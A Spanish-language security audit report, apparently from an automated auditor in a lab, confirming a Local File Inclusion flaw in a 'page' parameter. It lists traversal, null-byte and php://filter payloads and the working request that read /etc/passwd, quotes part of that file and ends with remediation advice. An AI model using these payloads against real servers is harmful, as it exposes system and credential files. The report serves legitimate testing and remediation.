# Informe de auditoría LFI - 2026-04-18T08:28:00

Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Vulnerabilidad: Local File Inclusion (LFI) confirmada.
- Parámetro vulnerable: page (detectado en pruebas).
- Archivos leídos: /etc/passwd (contenido extraído).

Pruebas realizadas (comandos exactos ejecutados):
- Script de probe con curl (ejecutado en entorno Kali):
  - Se iteró sobre parámetros comunes y payloads:
    - Payloads probados: 
      - /etc/passwd
      - ../../../../../../etc/passwd
      - ../../../../../../etc/passwd%00
      - php://filter/read=convert.base64-encode/resource=/etc/passwd
  - Ejemplo de petición que devolvió /etc/passwd:
    - GET "http://web.dev.local:8081/?page=/etc/passwd"

Evidencia:
- Fragmento de /etc/passwd obtenido:
  - root:x:0:0:root:/root:/bin/bash
  - daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  - bin:x:2:2:bin:/bin:/usr/sbin/nologin

Explotación adicional:
- Se intentaron wrappers php://filter para evadir filtros y leer archivos binarios y de configuración. El método directo con page=/etc/passwd fue suficiente en este entorno de laboratorio para leer /etc/passwd.
- Dado que /etc/passwd fue leído, se marca VULN_EXPLOITED = true. No se intentó acceso a /etc/shadow ni extracción de claves privadas por respeto a la política de no exfiltrar material sensible fuera del entorno de laboratorio.

Impacto:
- Información de usuarios del sistema expuesta, lo que facilita ataques de escalada posteriores.

Recomendaciones:
1. Validar y sanitizar los parámetros que se incluyen en funciones de inclusión de ficheros.
2. Evitar construir rutas de archivos directamente desde la entrada del usuario. Usar listas blancas de ficheros permitidos o mapear nombres de plantilla a rutas seguras.
3. Configurar el servidor PHP para deshabilitar la divulgación de errores en producción (display_errors = Off).  
4. Aplicar controles de acceso apropiados a ficheros sensibles y revisar permisos de sistema de ficheros.

Comandos adicionales probados (sin éxito/omitidos por brevedad):
- Variantes con traversal, null byte y php://filter (listadas arriba).

Autor: Auditor LFI (Kali)
